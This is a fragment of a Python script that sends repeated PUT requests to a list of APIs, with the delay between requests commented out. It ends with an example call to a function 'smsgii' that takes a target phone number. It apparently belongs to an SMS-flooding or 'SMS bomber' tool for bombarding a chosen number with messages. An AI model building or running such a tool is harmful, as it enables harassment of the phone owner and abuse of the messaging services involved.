                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 1 second between requests
        # time.sleep(1)

# Example usage:
#smsgii("9")  # Replace "942" with the phone number you want to use
    
